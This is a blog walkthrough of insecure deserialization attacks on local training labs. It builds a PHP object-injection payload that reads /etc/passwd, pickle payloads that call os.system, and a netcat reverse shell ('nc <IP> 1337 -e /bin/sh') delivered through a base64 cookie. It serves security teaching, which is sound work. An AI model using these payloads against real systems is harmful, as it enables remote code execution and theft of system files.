---
title: Deserializing the Deserialization attack
author: nirajkharel
date: 2023-03-18 20:55:00 +0800
categories: [Web Pentesting, Deserialization]
tags: [Web Pentesting, Deserialization]
---

# Deserializing-the-Deserialization-Attacks

I was solving one of the active box in HTB where I encountered some interesting Deserialization vulnerability. Although I managed to solve the box, I was more curious about the exploitation of deserialization vulnerability in different languages. Therefore this blog contains the walkthrough for deserialization attacks on Java, PHP, Python and Node.

The walkthrough is based on the lab https://github.com/NotSoSecure/NotSoCereal-Lab

Before jumping into the attacks, lets first clear the concept of serialization and deserialization.

## Serialization
It is a process of transforming a data object into the series of bytes. This is done while transmitting the data over the network or for storing it since the object's state can be retained and also the storage requirement can be reduced making it more efficient to transmit over the network. We are talking about the same objects we listen on OOP programming. Example, if a car is a class than object is a class instance that allows us to use variables and methods from inside the class. A car can have different properties like model name, color, engine size and so on and each time you want to add a new car in your code, you create a car object using the properties defiend like model name, color, engine size and so on.


Let's create a car object here.
```python
python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> class Car:
...     def __init__(self, modelname, color, enginesize):
...         self.modelname = modelname
...         self.color = color
...         self.enginesize = enginesize
... 
>>> my_car = Car("Toyota Corolla", "red", "2.0L")
>>> 
>>> print(my_car.modelname)
Toyota Corolla
>>> 

```

We can serialize the object in python with pickle module.
```python
python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> class Car:
...     def __init__(self, modelname, color, enginesize):
...         self.modelname = modelname
...         self.color = color
...         self.enginesize = enginesize
... 
>>> my_car = Car("Toyota Corolla", "red", "2.0L")
>>> 
>>> import pickle
>>> with open('car.pickle','wb') as f:
...     pickle.dump(my_car,f)
```

When we serialize the object above, we can have the result like
```bash
strings car.pickle 
__main__
        modelname
Toyota Corolla
color
enginesize
2.0L

```

Let's take an another example using PHP
```php
<?php

class myCar
{
    private $modelname;
    private $color;
    private $enginesize;

    public function __construct(string $modelname, string $color, string $enginesize)
    {
        $this->modelname = $modelname;
        $this->color = $color;
        $this->enginesize = $enginesize;
    }

}

$car1 = new myCar('Toyota Corolla','red','2.0L');
$str1 = serialize($car1);

var_dump($str1);
```
Save it as mycar.php and execute the command `php mycar.php`. We can have a serialize data as
```php
php mycar.php
string(128) "O:5:"myCar":3:{s:16:"myCarmodelname";s:14:"Toyota Corolla";s:12:"myCarcolor";s:3:"red";s:17:"myCarenginesize";s:4:"2.0L";}"
```
Thefore different languages have different ways to serializing the data object.
But what does that syntax means?

![image](https://user-images.githubusercontent.com/47778874/226155960-70f956c0-f087-4f4c-b1dd-6c92d6da4b38.png)


## Deserialization
It is a process in programming that involves converting a serialized object or a stream of bytes back into an object that can be used within a program. This is the reverse process of serialization, and it enables the program to access and manipulate the original object.

Example, we have serialized the data and kept in a file called `car.pickle` using python. Now inorder to use the data stored on it, we need to deserialized.
```python
python3           
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pickle
>>> class Car:
...     def __init__(self, modelname, color, enginesize):
...         self.modelname = modelname
...         self.color = color
...         self.enginesize = enginesize
... 
>>> with open('car.pickle','rb') as f:
...     data1 = pickle.load(f)
... 
>>> data1.modelname
'Toyota Corolla'
>>> data1.color
'red'
>>> data1.enginesize
'2.0L'

```

There are various serialization formats available.

| **Platform Agnostic** 	| **Platform Specific** 	|
|-----------------------	|-----------------------	|
| [XML](https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=net-7.0)                   	| [Python Pickle](https://docs.python.org/3/library/pickle.html)         	|
| [JSON](https://learn.microsoft.com/en-us/dotnet/api/system.text.json.jsonserializer?view=net-7.0)                  	| [PHP Serialize](https://www.php.net/manual/en/function.serialize.php)         	|
| [YAML](https://yaml.org/)                  	| [Java Serializable](https://www.javatpoint.com/serialization-in-java)    	|
| [TOML](https://github.com/status-im/nim-toml-serialization)                  	| [Ruby Marhsal](https://ruby-doc.org/core-2.6.3/Marshal.html)          	|
|                       	| [Node Serialize](https://www.npmjs.com/package/node-serialize)        	|

## What is Insecure Deserialization and how does it occur?
Insecure Deserialization also known as object injection is a vulnerability which occurs when user-supplied data in deserialized by an application. This can allow an attacker to manipulate or inject malicious code into the serialized object, and when it is deserialized into the application side, the malicious code submitted can change the angle of attack resulting the data exfiltration, remote code execution, authorization bypass and so on.

Exploiting this vulnerability is a not as easy as explained above. It requires a good understanding of programming languages and their object-oriented programming (OOP) concepts. Moreover, certain prerequisites should be in place in the vulnerable code for successful execution.

Let's take on example from Ippsec's [PHP Deserialization video.](https://www.youtube.com/watch?v=HaW15aMzBUM&t=321s)

**Server Code**<br>
Below is a simple PHP code which has a class called User and it has two attributes username and isAdmin. There is also a function which checks whether the user is an admin or not and prints the result accordingly. The code seems to accept the request using ippsec parameter in a serialized object format, it deserializes it and calls the function PrintData() using the deserialized object.

```php
<?php

class User
{
    public $username;
    public $isAdmin;

    public function PrintData(){
        if ($this->isAdmin){
            echo $this->username . " is an admin\n";
        }else{
          echo $this->username . " is not an admin\n";
        }
    }
}

$obj = unserialize($_POST['ippsec']);
$obj->PrintData();
```
Save the above code as `server.php`.

So how can we communicate with this piece of code? Let's create a PHP code which serializes our data and send it to the above application.
```php
<?php

class User
{
    public $username;
    public $isAdmin;
}

$obj = new User();
$obj->username = 'ippsec';
$obj->isAdmin = False;

echo serialize($obj);
```
Save the above code as `client.php`. The above code simply serializes the data that we need to submit into the server.

Run the basic PHP server command in the directory where server.php is located.
```bash
php -S 127.0.0.1 80
```

Run the client.php file to print the serialized data.
```bash
php client.php
O:4:"User":3:{s:8:"username";s:6:"ippsec";s:7:"isAdmin";N;s:7:"isAdmin";b:0;}
```
Now let's send the request to server.php file.
```bash
curl -XPOST -d 'ippsec=O:4:"User":3:{s:8:"username";s:6:"ippsec";s:7:"isAdmin";N;s:7:"isAdmin";b:0;}' 127.0.0.1:80/server.php
```
![image](https://user-images.githubusercontent.com/47778874/226165008-76df40d4-2f1e-4577-b51a-1afb932a0c4a.png)

Let's change the isAdmin value to True and send the request again. You need to edit the client.php file and change the value from False to True.
```bash
curl -XPOST -d 'ippsec=O:4:"User":3:{s:8:"username";s:6:"ippsec";s:7:"isAdmin";N;s:7:"isAdmin";b:1;}' 127.0.0.1:80/server.php
```
![image](https://user-images.githubusercontent.com/47778874/226165231-1c52b9f2-a381-4bd7-9d4b-e607b8780499.png)

Here we can see that the user can serialize the data and the application will proceed data submitted by a user. There is a possible chance that this code is vulnerable to insecure deserialization. But we can not just exploit it right away since there is no any dangerous functions implemented on here.

But suppose the application also contains a class to read the file content from the provided filename. To do such, it can have some magic methods availble like **__tostring()**. You can learn more magic functions in PHP [here](https://www.php.net/manual/en/language.oop5.magic.php). This makes our server.php code as below:
```php
<?php
class ReadFile
{
      public function __tostring()
      {
          return file_get_contents($this->filename);
      }
}
class User
{
    public $username;
    public $isAdmin;

    public function PrintData(){
        if ($this->isAdmin){
            echo $this->username . " is an admin\n";
        }else{
          echo $this->username . " is not an admin\n";
        }
    }
}
$obj = unserialize($_POST['ippsec']);
$obj->PrintData();
?>
```
So using the deserialization vulnerability, we can jump into the **__tostring()** method of ReadFile class ince it is defined there. Let's create our client.php file now.
```php
<?php

class ReadFile{
    public function __construct()
    {
        $this->filename = '/etc/passwd';
    }
}
class User
{
    public function __construct()
    {
        $this->username = new ReadFile();
        $this->isAdmin = True;
    }
}
$obj = new User();
echo serialize($obj);
?>
```
**So, what does this code actually do?**<br>
The code has two classes ReadFile and User. The ReadFile file class sets `/etc/passwd` on a variable filename under **__construct()** method which is a constructor. The User object is reconstructed and the **__construct()** method of the ReadFile class is called, which sets the filename property to `/etc/passwd`. This means that the ReadFile object assigned to the username property now contains a reference to the /etc/passwd file.

So, when we serialize the above code, it contains information about the "User" object and its properties, including the "ReadFile" object assigned to the "username" property. As a result, when the serialized object is tranmitted on the server.php file, it deserializes it and the object is injected, which means since ReadFile class is defined on the server.php file due to the **__tostring()** method the ReadFile class will be triggerred and `/etc/passwd` file will be passed on the parameter `filename` which will return the content of the file.

Create a malicious serialized object with above code.
```bash
bash client.php

O:4:"User":2:{s:8:"username";O:8:"ReadFile":1:{s:8:"filename";s:11:"/etc/passwd";}s:7:"isAdmin";b:1;}
```

Now again host the server.php and execute the payload.
```bash
php -S 127.0.0.1:80

curl -XPOST -d 'ippsec=O:4:"User":2:{s:8:"username";O:8:"ReadFile":1:{s:8:"filename";s:11:"/etc/passwd";}s:7:"isAdmin";b:1;}' 127.0.0.1/server.php
```

![image](https://user-images.githubusercontent.com/47778874/226169753-325de553-5a63-4582-861d-185de72f8f4b.png)

## Lab Demonstration
Let's move to the practical lab walkthrough now. Yes, we are yet to start the practical lab.

**The lab was supposed to be based on the [NotSoCereal](https://github.com/NotSoSecure/NotSoCereal-Lab/blob/main/Resources/Deployment/deployment.md) but the virtual machine for the box has been removed. I will explore the machine once it is accessible.**

### Deserialization on Python: DES-Pickle
I have found another lab for python deserialiazation attack lab https://github.com/blabla1337/skf-labs/tree/master/python/DES-Pickle
- Clone the repository https://github.com/blabla1337/skf-labs.git
    ```bash
    git clone https://github.com/blabla1337/skf-labs.git
    ```
- Navigate to `skf-labs/python/Des-Pickle`
    ```bash
    cd skf-labs/python/Des-Pickle
    
    # Recommending to remove exploit.py file inorder to avoid the spoiler.
    
    # Install the requirements
    pip3 install -r requirements.txt
    
    # And run the python file.
    python3 DES-Pickle.py
    
    # Navigate to 127.0.0.1:5000 on a browser.
    ```
- Open the URL on the browser, we can see a simple web page with a input field. 
![image](https://user-images.githubusercontent.com/47778874/226404037-07535e7a-b665-4c1a-8113-fc5fbb16604a.png)

- Intercept the request on burp and send some random text. It looks like the application sends POST request to **/sync** and the body parameter is **data_obj**
![image](https://user-images.githubusercontent.com/47778874/226195588-b3c6f568-cdf0-4a50-adb8-de3decb0b5fe.png)

- Lets view the source code **DES-Pickle.py**<br>
```python
@app.route("/sync", methods=['POST'])
def deserialization():
        with open("pickle.hacker", "wb+") as file:
            att = request.form['data_obj']
            attack = bytes.fromhex(att)
            file.write(attack)
            file.close()
        with open('pickle.hacker', 'rb') as handle:
            a = pickle.load(handle)
            print(attack)
            return render_template("index.html", content = a)
```
- Viewing the source code we can find that when POST request is performed on **/sync** path, a method **deserialization()** is triggered. The method stores the value obtained from data_obj parameter and save it to **pickle.handler**. And then it deserializes the data from **picke.handler** file using pickle.load method and renders the output in an HTML file.
- The method called **reduce()** doesn't require any input and should provide a string or a tuple as its output. The resulting object is commonly known as the **reduce value.** If a tuple is returned, it must contain between two and six items, and optional items can be left out or replaced with None. The meaning of each item is as follows, in order:
    - A callable object that will be used to create the object's initial version.
    - A tuple of arguments to pass to the callable object. If the callable doesn't accept any arguments, an empty tuple must be provided.
   
- In order to exploit it, we need to create a serialize data. Pickle allows different objects to declare how they should be pickled using the **__reduce__** method. Whenever an object is pickled, the **__reduce__** method defined by it gets called. 
- In the below code we are just defining a class **test123** which contains the **__reduce__method**, it returns a callable object as **os.system()** and a tuple of arguments as **sleep 5**.
```python
import os
import pickle

class test123():
	def __reduce__(self):
		return (os.system, ('sleep 5',))

data123 = pickle.dumps(test123())
print(data123)
```
- Running the code we can have
```bash
python3 deseee.py
b'\x80\x04\x95"\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x07sleep 5\x94\x85\x94R\x94.'
```
- Since the application DES-Pickle.py have bytes.fromhex() method implemented, we need to convert the above binary into hex. We can do it using binascii.hexlify(). It makes our final payload as
```python3
import os
import pickle
import binascii

class test123():
	def __reduce__(self):
		return (os.system, ('sleep 5',))

data123 = pickle.dumps(test123())
print(binascii.hexlify(data123)
```
- Run the code again.
```bash
python3 descee.py
b'80049522000000000000008c05706f736978948c0673797374656d9493948c07736c656570203594859452942e'
```
- Copy only the value and submit the request again. Since we have told the application to sleep for 5 seconds, it will respond after 5 seconds indicating the command execution on it. 

![image](https://user-images.githubusercontent.com/47778874/226198194-da71f745-bbea-4e76-a9ac-935187a69c3e.png)

### Deserialization on Python: DES-Pickle-2
- Clone the same github repository as above.
```bash
git clone https://github.com/blabla1337/skf-labs.git
cd skf-labs/python/DES-Pickle-2
rm rev.py # To prevent spoiler

python3 Login.py
```
- Open the provided URL on a browser.
- The application seems to have a login and registration page.
- Let's directly jump into the source code. Open the `Login.py` file.
- Between line 26 and 34 we can see that the application has implemented python pickle module.
```python
@app.route("/login", methods=['GET', 'POST'])
def login():
    sqli  = Classes()
    if 'rememberme' in request.cookies:
        b64=request.cookies.get('rememberme')
        a = pickle.loads(base64.b64decode(b64))
        session['username'] = a.username
        session['loggedin'] = True
        return render_template("loggedin.html")
```
- Here the code shows that whenever a **GET** or **POST** method is initiated on the **/login** endpoint, the **login()** method is triggered. The parameter **rememberme** is expected on the cookies and after decompiling the cookies with base64 decode, it is passed into the **pickle.load()** method. 
- Let's create a python script.
```python
import pickle
import base64
import os

class payloads(object):
  def __reduce__(self):
      return (os.system,("sleep 5",))

print(base64.b64encode(pickle.dumps(payloads())))
```
- Here we defined a class and created a **__reduce__** method which returns the tuple value. The object is dumped using pickle.dumps, encoded with base64 encoder and printed.
```bash
python3 exploit.py
b'ASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu'
```
- Open the application and register a new user.
- Enter username and password and login.
- Intercept the request in burp as well.
- After login, refresh the page and intercept it with burp.
- Replace the **rememberme** parameter value with **ASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu**<br>
- Check if the application responds after 5 seconds. If yes, the exploit is possible.
- Listen to traffic using netcat
```bash
nc -lvnp 1337
```
- Create a script **exploit.py** again and insert the reverse shell payload as below.
```python
import pickle
import base64
import os

class payloads(object):
  def __reduce__(self):
      return (os.system,("nc <IP> 1337 -e /bin/sh",)) # replace <IP> 

print(base64.b64encode(pickle.dumps(payloads())))
```
- Run the script
```bash
python3 exploit.py
b'gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9uYyAxOTIuMTY4LjEuNjQgMTMzNyAtZSAvYmluL3NolIWUUpQu'
```
- Replace the **rememberme** parameter value with **gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9uYyAxOTIuMTY4LjEuNjQgMTMzNyAtZSAvYmluL3NolIWUUpQu**<br>
![image](https://user-images.githubusercontent.com/47778874/226403615-1d7cc995-3faa-44e1-830e-f9185b4c0882.png)
- A reverse shell can be received.
![image](https://user-images.githubusercontent.com/47778874/226403735-afca20b3-1e38-4562-b5f7-af66b2aefdf9.png)

**Learn about Python Deserialization Attack more on:** https://davidhamann.de/2020/04/05/exploiting-python-pickle/ 
